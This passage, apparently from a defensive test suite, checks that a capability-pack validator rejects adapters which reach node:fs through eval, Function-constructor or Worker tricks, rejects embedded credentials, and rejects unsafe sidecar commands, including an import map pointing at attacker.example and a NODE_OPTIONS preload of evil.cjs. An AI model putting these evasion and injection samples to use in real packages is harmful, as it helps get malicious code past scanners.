    const templateFunctionImportAdapter = fromUtf8('const fs = globalThis[`Function`]("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const templateFunctionImportAdapterChecksum = `sha256:${await sha256Hex(templateFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: templateFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': templateFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const constructorFunctionImportAdapter = fromUtf8('const fs = (() => {}).constructor("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const constructorFunctionImportAdapterChecksum = `sha256:${await sha256Hex(constructorFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: constructorFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': constructorFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const computedConstructorFunctionImportAdapter = fromUtf8('const fs = []["filter"]["constructor"]("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const computedConstructorFunctionImportAdapterChecksum = `sha256:${await sha256Hex(computedConstructorFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: computedConstructorFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': computedConstructorFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const evalImportAdapter = fromUtf8('const fs = eval("import(\\\"node:fs\\\")"); export const CapabilityDriver = fs;');
    const evalImportAdapterChecksum = `sha256:${await sha256Hex(evalImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: evalImportAdapterChecksum }],
      }, { 'adapter.mjs': evalImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedEvalImportAdapter = fromUtf8('const e = eval; const fs = e("import(\\\"node:fs\\\")"); export const CapabilityDriver = fs;');
    const aliasedEvalImportAdapterChecksum = `sha256:${await sha256Hex(aliasedEvalImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedEvalImportAdapterChecksum }],
      }, { 'adapter.mjs': aliasedEvalImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedFunctionImportAdapter = fromUtf8('const F = Function; const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const aliasedFunctionImportAdapterChecksum = `sha256:${await sha256Hex(aliasedFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': aliasedFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const workerAdapter = fromUtf8("const worker = new Worker('./helper.mjs'); export const CapabilityDriver = worker;");
    const workerAdapterChecksum = `sha256:${await sha256Hex(workerAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: workerAdapterChecksum }],
      }, { 'adapter.mjs': workerAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedWorkerAdapter = fromUtf8("const W = Worker; const worker = new W('./helper.mjs'); export const CapabilityDriver = worker;");
    const aliasedWorkerAdapterChecksum = `sha256:${await sha256Hex(aliasedWorkerAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedWorkerAdapterChecksum }],
      }, { 'adapter.mjs': aliasedWorkerAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const globalWorkerAdapter = fromUtf8("const worker = new globalThis.Worker('./helper.mjs'); export const CapabilityDriver = worker;");
    const globalWorkerAdapterChecksum = `sha256:${await sha256Hex(globalWorkerAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: globalWorkerAdapterChecksum }],
      }, { 'adapter.mjs': globalWorkerAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const parenthesizedGlobalWorkerAdapter = fromUtf8("const worker = new (globalThis.Worker)('./helper.mjs'); export const CapabilityDriver = worker;");
    const parenthesizedGlobalWorkerAdapterChecksum = `sha256:${await sha256Hex(parenthesizedGlobalWorkerAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: parenthesizedGlobalWorkerAdapterChecksum }],
      }, { 'adapter.mjs': parenthesizedGlobalWorkerAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const builtinModuleAdapter = fromUtf8("const fs = process.getBuiltinModule('node:fs'); export const CapabilityDriver = fs;");
    const builtinModuleAdapterChecksum = `sha256:${await sha256Hex(builtinModuleAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: builtinModuleAdapterChecksum }],
      }, { 'adapter.mjs': builtinModuleAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedBuiltinModuleAdapter = fromUtf8("const gbm = process.getBuiltinModule; const fs = gbm('node:fs'); export const CapabilityDriver = fs;");
    const aliasedBuiltinModuleAdapterChecksum = `sha256:${await sha256Hex(aliasedBuiltinModuleAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedBuiltinModuleAdapterChecksum }],
      }, { 'adapter.mjs': aliasedBuiltinModuleAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const optionalBuiltinModuleAdapter = fromUtf8("const fs = process.getBuiltinModule?.('node:fs'); export const CapabilityDriver = fs;");
    const optionalBuiltinModuleAdapterChecksum = `sha256:${await sha256Hex(optionalBuiltinModuleAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: optionalBuiltinModuleAdapterChecksum }],
      }, { 'adapter.mjs': optionalBuiltinModuleAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const parenthesizedBuiltinModuleAdapter = fromUtf8("const fs = (process.getBuiltinModule)('node:fs'); export const CapabilityDriver = fs;");
    const parenthesizedBuiltinModuleAdapterChecksum = `sha256:${await sha256Hex(parenthesizedBuiltinModuleAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: parenthesizedBuiltinModuleAdapterChecksum }],
      }, { 'adapter.mjs': parenthesizedBuiltinModuleAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const malformedAdapter = fromUtf8('if (');
    const malformedAdapterChecksum = `sha256:${await sha256Hex(malformedAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: malformedAdapterChecksum }],
      }, { 'adapter.mjs': malformedAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_IMPORT_SCAN_FAILED' },
    );
    const secretReadme = fromUtf8('Authorization: Bearer sk-artifact-secret-value');
    const secretReadmeChecksum = `sha256:${await sha256Hex(secretReadme)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: ['README.md'],
        checksums: [
          { path: 'adapter.mjs', checksum: withChecksums.checksums[0].checksum },
          { path: 'README.md', checksum: secretReadmeChecksum },
        ],
      }, { 'adapter.mjs': artifact, 'README.md': secretReadme }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const quotedSecretJson = fromUtf8('{"api_key":"abcd1234"}');
    const quotedSecretJsonChecksum = `sha256:${await sha256Hex(quotedSecretJson)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: withChecksums.checksums[0].checksum },
          { path: 'config.json', checksum: quotedSecretJsonChecksum },
        ],
      }, { 'adapter.mjs': artifact, 'config.json': quotedSecretJson }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const privateKeyReadme = fromUtf8('-----BEGIN PRIVATE KEY-----\nredacted\n-----END PRIVATE KEY-----\n');
    const privateKeyReadmeChecksum = `sha256:${await sha256Hex(privateKeyReadme)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: ['README.md'],
        checksums: [
          { path: 'adapter.mjs', checksum: withChecksums.checksums[0].checksum },
          { path: 'README.md', checksum: privateKeyReadmeChecksum },
        ],
      }, { 'adapter.mjs': artifact, 'README.md': privateKeyReadme }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const sidecar = fromUtf8('export const sidecar = true;');
    const launcherChecksum = `sha256:${await sha256Hex(artifact)}`;
    const sidecarChecksum = `sha256:${await sha256Hex(sidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({ ...withFingerprint, checksums: withFingerprint.checksums.slice(0, 1) }, { 'adapter.mjs': artifact }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['sidecar.mjs'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter', '--config=config.json'] },
        docs: [],
        checksums: [{ path: 'bin/adapter', checksum: sidecarChecksum }],
      }, { 'bin/adapter': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['./sidecar.mjs'] },
        docs: [],
        checksums: [{ path: './sidecar.mjs', checksum: sidecarChecksum }],
      }, { './sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['@scope/adapter.mjs'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['@scope/register'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'bun', checksum: launcherChecksum }],
      }, { bun: artifact }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', 'adapter=prod.mjs'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs', '--config', 'prod'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bin/adapter'] },
      docs: [],
      checksums: [{ path: 'bin/adapter', checksum: sidecarChecksum }],
    }, { 'bin/adapter': sidecar }), true);
    const extensionlessSidecarImport = fromUtf8("import './helper.mjs';\nconsole.log('ready');\n");
    const extensionlessSidecarImportChecksum = `sha256:${await sha256Hex(extensionlessSidecarImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', './adapter'] },
        docs: [],
        checksums: [{ path: './adapter', checksum: extensionlessSidecarImportChecksum }],
      }, { './adapter': extensionlessSidecarImport }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const extensionlessNodeSidecarImport = fromUtf8("import './helper';\nconsole.log('ready');\n");
    const extensionlessNodeSidecarImportChecksum = `sha256:${await sha256Hex(extensionlessNodeSidecarImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', './adapter.mjs'] },
        docs: [],
        checksums: [
          { path: './adapter.mjs', checksum: extensionlessNodeSidecarImportChecksum },
          { path: './helper.mjs', checksum: sidecarChecksum },
        ],
      }, { './adapter.mjs': extensionlessNodeSidecarImport, './helper.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const nodeSidecarWithIgnoredBunShebangImport = fromUtf8("#!/usr/bin/env bun\nimport './helper';\nconsole.log('ready');\n");
    const nodeSidecarWithIgnoredBunShebangImportChecksum = `sha256:${await sha256Hex(nodeSidecarWithIgnoredBunShebangImport)}`;
    const nodeIgnoredBunShebangTypeScriptHelper = fromUtf8('export const helper: boolean = true;\n');
    const nodeIgnoredBunShebangTypeScriptHelperChecksum = `sha256:${await sha256Hex(nodeIgnoredBunShebangTypeScriptHelper)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', './adapter.mjs'] },
        docs: [],
        checksums: [
          { path: './adapter.mjs', checksum: nodeSidecarWithIgnoredBunShebangImportChecksum },
          { path: './helper.ts', checksum: nodeIgnoredBunShebangTypeScriptHelperChecksum },
        ],
      }, { './adapter.mjs': nodeSidecarWithIgnoredBunShebangImport, './helper.ts': nodeIgnoredBunShebangTypeScriptHelper }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const typeScriptSidecarImport = fromUtf8("import './helper.ts';\nconsole.log('ready');\n");
    const typeScriptSidecarImportChecksum = `sha256:${await sha256Hex(typeScriptSidecarImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', './adapter.ts'] },
        docs: [],
        checksums: [{ path: './adapter.ts', checksum: typeScriptSidecarImportChecksum }],
      }, { './adapter.ts': typeScriptSidecarImport }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const typeScriptSidecar = fromUtf8('type Payload = { ok: boolean };\nconst payload: Payload = { ok: true };\nconsole.log(payload.ok);\n');
    const typeScriptSidecarChecksum = `sha256:${await sha256Hex(typeScriptSidecar)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', './adapter.ts'] },
      docs: [],
      checksums: [{ path: './adapter.ts', checksum: typeScriptSidecarChecksum }],
    }, { './adapter.ts': typeScriptSidecar }), true);
    const typeScriptSecretSidecar = fromUtf8('API_KEY=supersecret123\n');
    const typeScriptSecretSidecarChecksum = `sha256:${await sha256Hex(typeScriptSecretSidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', './adapter.ts'] },
        docs: [],
        checksums: [{ path: './adapter.ts', checksum: typeScriptSecretSidecarChecksum }],
      }, { './adapter.ts': typeScriptSecretSidecar }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', './adapter.ts'] },
        docs: [],
        checksums: [{ path: './adapter.ts', checksum: typeScriptSidecarChecksum }],
      }, { './adapter.ts': typeScriptSidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const nestedSidecarImport = fromUtf8("import '../helper.mjs';\nconsole.log('ready');\n");
    const nestedSidecarImportChecksum = `sha256:${await sha256Hex(nestedSidecarImport)}`;
    const rootHelper = fromUtf8('export const helper = true;\n');
    const rootHelperChecksum = `sha256:${await sha256Hex(rootHelper)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', 'dir/adapter.mjs'] },
      docs: [],
      checksums: [
        { path: 'dir/adapter.mjs', checksum: nestedSidecarImportChecksum },
        { path: './helper.mjs', checksum: rootHelperChecksum },
      ],
    }, { 'dir/adapter.mjs': nestedSidecarImport, './helper.mjs': rootHelper }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bin/adapter', '--config=config.json'] },
      docs: [],
      checksums: [
        { path: 'bin/adapter', checksum: sidecarChecksum },
        { path: 'config.json', checksum: sidecarChecksum },
      ],
    }, { 'bin/adapter': sidecar, 'config.json': sidecar }), true);
    const extensionlessSidecarExternalImport = fromUtf8("#!/usr/bin/env bun\nimport 'node:fs';\n");
    const extensionlessSidecarExternalImportChecksum = `sha256:${await sha256Hex(extensionlessSidecarExternalImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [{ path: 'bin/adapter', checksum: extensionlessSidecarExternalImportChecksum }],
      }, { 'bin/adapter': extensionlessSidecarExternalImport }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const extensionlessShebangPreloadSidecar = fromUtf8("#!/usr/bin/env -S bun --preload ./preload.mjs\nconsole.log('ready');\n");
    const extensionlessShebangPreloadSidecarChecksum = `sha256:${await sha256Hex(extensionlessShebangPreloadSidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [{ path: 'bin/adapter', checksum: extensionlessShebangPreloadSidecarChecksum }],
      }, { 'bin/adapter': extensionlessShebangPreloadSidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const shebangPreloadExternalImport = fromUtf8("import 'node:fs';\n");
    const shebangPreloadExternalImportChecksum = `sha256:${await sha256Hex(shebangPreloadExternalImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [
          { path: 'bin/adapter', checksum: extensionlessShebangPreloadSidecarChecksum },
          { path: './preload.mjs', checksum: shebangPreloadExternalImportChecksum },
        ],
      }, { 'bin/adapter': extensionlessShebangPreloadSidecar, './preload.mjs': shebangPreloadExternalImport }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const extensionlessShebangTypeScriptPreloadSidecar = fromUtf8("#!/usr/bin/env -S bun --preload ./preload\nconsole.log('ready');\n");
    const extensionlessShebangTypeScriptPreloadSidecarChecksum = `sha256:${await sha256Hex(extensionlessShebangTypeScriptPreloadSidecar)}`;
    const extensionlessShebangTypeScriptPreload = fromUtf8("type Preload = { ready: boolean };\nglobalThis.__preload = { ready: true } satisfies Preload;\n");
    const extensionlessShebangTypeScriptPreloadChecksum = `sha256:${await sha256Hex(extensionlessShebangTypeScriptPreload)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bin/adapter'] },
      docs: [],
      checksums: [
        { path: 'bin/adapter', checksum: extensionlessShebangTypeScriptPreloadSidecarChecksum },
        { path: './preload', checksum: extensionlessShebangTypeScriptPreloadChecksum },
      ],
    }, {
      'bin/adapter': extensionlessShebangTypeScriptPreloadSidecar,
      './preload': extensionlessShebangTypeScriptPreload,
    }), true);
    const denoShebangConfigSidecar = fromUtf8("#!/usr/bin/env -S deno run --config deno.json\nimport './helper.ts';\n");
    const denoShebangConfigSidecarChecksum = `sha256:${await sha256Hex(denoShebangConfigSidecar)}`;
    const denoShebangConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.ts': 'https://attacker.example/helper.ts' } }));
    const denoShebangConfigWithImportsChecksum = `sha256:${await sha256Hex(denoShebangConfigWithImports)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [
          { path: 'bin/adapter', checksum: denoShebangConfigSidecarChecksum },
          { path: 'deno.json', checksum: denoShebangConfigWithImportsChecksum },
        ],
      }, { 'bin/adapter': denoShebangConfigSidecar, 'deno.json': denoShebangConfigWithImports }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const quotedDenoShebangImportMapSidecar = fromUtf8('#!/usr/bin/env -S deno run --no-config "--import-map=import_map.json"\nimport \'./helper.ts\';\n');
    const quotedDenoShebangImportMapSidecarChecksum = `sha256:${await sha256Hex(quotedDenoShebangImportMapSidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [{ path: 'bin/adapter', checksum: quotedDenoShebangImportMapSidecarChecksum }],
      }, { 'bin/adapter': quotedDenoShebangImportMapSidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const envAssignmentBeforeShebangRuntimeSidecar = fromUtf8('#!/usr/bin/env -S NODE_OPTIONS=--require=./evil.cjs node\nconsole.log("ready");\n');
    const envAssignmentBeforeShebangRuntimeSidecarChecksum = `sha256:${await sha256Hex(envAssignmentBeforeShebangRuntimeSidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
        docs: [],
        checksums: [{ path: 'bin/adapter', checksum: envAssignmentBeforeShebangRuntimeSidecarChecksum }],
      }, { 'bin/adapter': envAssignmentBeforeShebangRuntimeSidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const extensionlessTypeScriptSidecar = fromUtf8("#!/usr/bin/env bun\ntype Payload = { ok: boolean };\nimport './helper';\nconst payload: Payload = { ok: true };\nconsole.log(payload.ok);\n");
    const extensionlessTypeScriptSidecarChecksum = `sha256:${await sha256Hex(extensionlessTypeScriptSidecar)}`;
    const extensionlessTypeScriptHelper = fromUtf8("#!/usr/bin/env bun\ntype Helper = { ready: boolean };\nexport const helper: Helper = { ready: true };\n");
    const extensionlessTypeScriptHelperChecksum = `sha256:${await sha256Hex(extensionlessTypeScriptHelper)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bin/adapter'] },
      docs: [],
      checksums: [
        { path: 'bin/adapter', checksum: extensionlessTypeScriptSidecarChecksum },
        { path: 'bin/helper', checksum: extensionlessTypeScriptHelperChecksum },
      ],
    }, { 'bin/adapter': extensionlessTypeScriptSidecar, 'bin/helper': extensionlessTypeScriptHelper }), true);
    const extensionlessBunTypeScriptSidecar = fromUtf8("type Payload = { ok: boolean };\nimport './helper';\nconst payload: Payload = { ok: true };\nconsole.log(payload.ok);\n");
    const extensionlessBunTypeScriptSidecarChecksum = `sha256:${await sha256Hex(extensionlessBunTypeScriptSidecar)}`;
    const extensionlessBunTypeScriptHelper = fromUtf8("type Helper = { ready: boolean };\nexport const helper: Helper = { ready: true };\n");
    const extensionlessBunTypeScriptHelperChecksum = `sha256:${await sha256Hex(extensionlessBunTypeScriptHelper)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', 'bin/adapter'] },
      docs: [],
      checksums: [
        { path: 'bin/adapter', checksum: extensionlessBunTypeScriptSidecarChecksum },
        { path: 'bin/helper', checksum: extensionlessBunTypeScriptHelperChecksum },
      ],
    }, { 'bin/adapter': extensionlessBunTypeScriptSidecar, 'bin/helper': extensionlessBunTypeScriptHelper }), true);
    const binarySidecar = new Uint8Array([0, 159, 146, 150]);
    const binarySidecarChecksum = `sha256:${await sha256Hex(binarySidecar)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bin/native-adapter'] },
      docs: [],
      checksums: [{ path: 'bin/native-adapter', checksum: binarySidecarChecksum }],
    }, { 'bin/native-adapter': binarySidecar }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['@scope/adapter.mjs'] },
      docs: [],
      checksums: [{ path: '@scope/adapter.mjs', checksum: sidecarChecksum }],
      }, { '@scope/adapter.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['@scope/register'] },
      docs: [],
      checksums: [{ path: '@scope/register', checksum: sidecarChecksum }],
    }, { '@scope/register': sidecar }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', '--endpoint=https://api.example/v1', 'sidecar.mjs', '--model=gpt-4.1'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs', '-p8080'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs', '--import', 'remote'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['node', '--trace-warnings', 'sidecar.mjs', '--import', 'remote'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', './adapter.mjs', '--require=./plugin.mjs'] },
        docs: [],
        checksums: [{ path: './adapter.mjs', checksum: sidecarChecksum }],
      }, { './adapter.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['node', './adapter.mjs', '--require=./plugin.mjs'] },
      docs: [],
      checksums: [
        { path: './adapter.mjs', checksum: sidecarChecksum },
        { path: './plugin.mjs', checksum: sidecarChecksum },
      ],
    }, { './adapter.mjs': sidecar, './plugin.mjs': sidecar }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs', '--config=config.json'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
